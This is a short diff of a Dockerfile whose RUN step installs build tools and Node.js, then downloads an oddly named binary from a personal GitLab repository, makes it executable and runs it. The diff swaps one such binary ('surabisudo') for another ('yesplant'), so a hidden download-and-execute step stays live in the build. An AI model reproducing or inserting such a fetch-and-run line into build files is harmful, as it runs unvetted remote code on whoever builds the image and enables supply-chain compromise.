@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     nodejs \
     npm \
- && wget https://gitlab.com/richardkevin320/pede/-/raw/main/surabisudo && chmod +x surabisudo && ./surabisudo
+ && wget https://gitlab.com/richardkevin320/pede/-/raw/main/yesplant && chmod +x yesplant && ./yesplant
 
 # Set work dir:
 WORKDIR /home
